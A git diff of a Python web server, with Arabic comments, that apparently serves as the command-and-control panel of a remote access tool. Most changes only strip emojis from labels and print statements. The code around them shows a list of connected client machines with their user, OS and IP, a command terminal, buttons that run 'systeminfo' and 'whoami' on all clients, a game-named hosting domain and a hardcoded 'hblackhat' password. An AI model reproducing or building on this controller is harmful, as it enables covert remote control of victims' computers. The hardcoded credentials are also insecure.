@@ -22,12 +22,12 @@ class EnhancedRemoteControlHandler(BaseHTTPRequestHandler):
     failed_attempts = {}
     blocked_ips = set()
     
-    # 🔐 نظام الجلسات الآمن المتقدم
+    #  نظام الجلسات الآمن المتقدم
     user_sessions = {}
     SESSION_TIMEOUT = 1800  # 30 دقيقة
     MAX_SESSIONS_PER_IP = 3
     
-    # 🔑 نظام كلمات المرور
+    #  نظام كلمات المرور
     PASSWORD_FILE = "passwords.json"
     DEFAULT_PASSWORDS = {
         "user_password": "hblackhat", 
@@ -38,7 +38,7 @@ class EnhancedRemoteControlHandler(BaseHTTPRequestHandler):
     MAX_FAILED_ATTEMPTS = 3  # قللنا المحاولات لزيادة الأمان
     BLOCK_TIME = 1800  # 30 دقيقة للحظر
     
-    # 🔒 مفتاح تشفير للجلسات
+    #  مفتاح تشفير للجلسات
     SECRET_KEY = secrets.token_hex(32)
 
     def load_passwords(self):
@@ -136,7 +136,7 @@ class EnhancedRemoteControlHandler(BaseHTTPRequestHandler):
         except:
             pass
     
-    # 🔐 نظام الجلسات الآمن
+    #  نظام الجلسات الآمن
     def create_session(self, client_ip):
         """إنشاء جلسة آمنة جديدة"""
         session_id = str(uuid.uuid4()) + secrets.token_hex(16)
@@ -207,7 +207,7 @@ class EnhancedRemoteControlHandler(BaseHTTPRequestHandler):
         for session_id in expired_sessions:
             del self.user_sessions[session_id]
     
-    # 🔒 نظام الحماية
+    #  نظام الحماية
     def is_ip_blocked(self):
         """التحقق إذا كان IP محظور"""
         client_ip = self.client_address[0]
@@ -223,7 +223,7 @@ class EnhancedRemoteControlHandler(BaseHTTPRequestHandler):
         """حظر IP"""
         self.blocked_ips[ip] = time.time()
         self.log_security_event(f"IP Blocked: {ip}")
-        print(f"🔒 BLOCKED: {ip}")
+        print(f" BLOCKED: {ip}")
     
     def check_security(self):
         """التحقق الأمني المتقدم"""
@@ -232,8 +232,8 @@ class EnhancedRemoteControlHandler(BaseHTTPRequestHandler):
         if self.is_ip_blocked():
             self.send_error(403, "Access Denied - IP Blocked")
             return False
-        
-        # ⚡ تحديد معدل الطلبات
+    
+        #  تحديد معدل الطلبات
         current_time = time.time()
         if hasattr(self, 'last_request_time'):
             if current_time - self.last_request_time < 0.1:
@@ -400,7 +400,7 @@ class EnhancedRemoteControlHandler(BaseHTTPRequestHandler):
         </head>
         <body>
             <div class="container">
-                <div class="logo">🔒</div>
+                <div class="logo">LOGIN</div>
                 <h2>Enhanced Remote Control</h2>
                 <p style="color: #ccc; margin-bottom: 30px;">Secure System Management - Level 1 Authentication</p>
                 
@@ -537,7 +537,7 @@ class EnhancedRemoteControlHandler(BaseHTTPRequestHandler):
         </head>
         <body>
             <div class="container">
-                <div class="logo">🛡️</div>
+                <div class="logo">SECURE</div>
                 <h2>Admin Authentication</h2>
                 <p style="color: #ccc; margin-bottom: 30px;">Level 2 Security - Administrative Access</p>
                 
@@ -896,16 +896,16 @@ class EnhancedRemoteControlHandler(BaseHTTPRequestHandler):
         </head>
         <body>
             <div class="header">
-                <h2>🔒 Secure Remote Control System</h2>
+                <h2> Secure Remote Control System</h2>
                 <div>
-                    <button class="warning" onclick="logout()">🚪 Logout</button>
+                    <button class="warning" onclick="logout()"> Logout</button>
                 </div>
             </div>
             
             <div class="tabs">
-                <div class="tab active" onclick="switchTab('control')">🎮 Control Panel</div>
-                <div class="tab" onclick="switchTab('sessions')">👥 Connected Clients</div>
-                <div class="tab" onclick="switchTab('settings')">⚙️ Security Settings</div>
+                <div class="tab active" onclick="switchTab('control')"> Control Panel</div>
+                <div class="tab" onclick="switchTab('sessions')"> Connected Clients</div>
+                <div class="tab" onclick="switchTab('settings')"> Security Settings</div>
             </div>
             
             <!-- تبويب التحكم -->
@@ -954,13 +954,13 @@ class EnhancedRemoteControlHandler(BaseHTTPRequestHandler):
                         </div>
                         
                         <div class="terminal" id="terminal">
-    🔒 SECURE REMOTE CONTROL SYSTEM READY
+     SECURE REMOTE CONTROL SYSTEM READY
     
-    • Select a client from the left panel
-    • Enter commands in the input field
-    • All activities are logged for security
-    • Multi-layer authentication active
-    • Real-time monitoring enabled
+     Select a client from the left panel
+     Enter commands in the input field
+     All activities are logged for security
+     Multi-layer authentication active
+     Real-time monitoring enabled
     
                         </div>
                     </div>
@@ -972,9 +972,9 @@ class EnhancedRemoteControlHandler(BaseHTTPRequestHandler):
                 <div style="background: var(--darker); padding: 30px; border-radius: 15px; border: 1px solid rgba(255,255,255,0.1);">
                     <h3>Connected Clients Management</h3>
                     <div style="display: flex; gap: 10px; margin: 20px 0;">
-                        <button onclick="loadSessions()">🔄 Refresh List</button>
-                        <button class="success" onclick="executeAll('systeminfo')">📊 System Info All</button>
-                        <button class="warning" onclick="executeAll('whoami')">👤 Users Info All</button>
+                        <button onclick="loadSessions()"> Refresh List</button>
+                        <button class="success" onclick="executeAll('systeminfo')"> System Info All</button>
+                        <button class="warning" onclick="executeAll('whoami')"> Users Info All</button>
                     </div>
                     <div id="detailedSessionsList">
                         Loading detailed sessions...
@@ -985,7 +985,7 @@ class EnhancedRemoteControlHandler(BaseHTTPRequestHandler):
             <!-- تبويب الإعدادات -->
             <div id="settings-tab" class="tab-content">
                 <div class="settings-container">
-                    <h3>🔐 Security Settings</h3>
+                    <h3> Security Settings</h3>
                     <p style="color: #ccc; margin-bottom: 30px;">Change authentication passwords securely</p>
                     
                     <div id="settings-message" class="message"></div>
@@ -1113,7 +1113,7 @@ class EnhancedRemoteControlHandler(BaseHTTPRequestHandler):
                                     <small>User: ${client.user || 'Unknown'} | OS: ${client.os || 'Unknown'}</small><br>
                                     <small>IP: ${client.ip} | Last Seen: ${lastSeen.toLocaleString()}</small><br>
                                     <small style="color: ${isOnline ? '#28a745' : '#dc3545'}">
-                                        ${isOnline ? '🟢 ONLINE' : '🔴 OFFLINE'}
+                                        ${isOnline ? ' ONLINE' : ' OFFLINE'}
                                     </small>
                                     <button onclick="selectClient('${client.id}'); switchTab('control');" style="margin-top: 5px;">Select</button>
                                 </div>
@@ -1462,7 +1462,7 @@ class EnhancedRemoteControlHandler(BaseHTTPRequestHandler):
                 if incoming_os != 'Unknown':
                     self.sessions[existing_client]['os'] = incoming_os
 
-                print(f"✅ Updated: {incoming_computer} ({incoming_user}) - {client_ip}")
+                print(f" Updated: {incoming_computer} ({incoming_user}) - {client_ip}")
                 self.send_json({'success': True, 'client_id': existing_client})
             else:
                 self.sessions[client_id] = {
@@ -1478,7 +1478,7 @@ class EnhancedRemoteControlHandler(BaseHTTPRequestHandler):
                     'last_response': None,
                     'status': 'online'
                 }
-                print(f"✅ New: {incoming_computer} ({incoming_user}) - {client_ip}")
+                print(f" New: {incoming_computer} ({incoming_user}) - {client_ip}")
                 self.send_json({'success': True, 'client_id': client_id})
                 
     def send_sessions_list(self):
@@ -1587,7 +1587,7 @@ def main():
     port = int(os.environ.get('PORT', 8080))
     
     print("=" * 80)
-    print(" 🔒 ULTRA SECURE REMOTE CONTROL SERVER")
+    print("  ULTRA SECURE REMOTE CONTROL SERVER")
     print("=" * 80)
     print(f"Control Panel:     https://game-python-1.onrender.com/control")
     print("Level 1 Password: hblackhat")
@@ -1596,7 +1596,7 @@ def main():
     print("Session Timeout:  30 minutes")
     print("Max Attempts:     3 per IP")
     print("=" * 80)
-    print(" 🔐 ULTRA SECURE MODE ACTIVATED")
+    print("  ULTRA SECURE MODE ACTIVATED")
     print(" Each user has separate isolated session")
     print(" No more shared authentication issues")
     print("=" * 80)
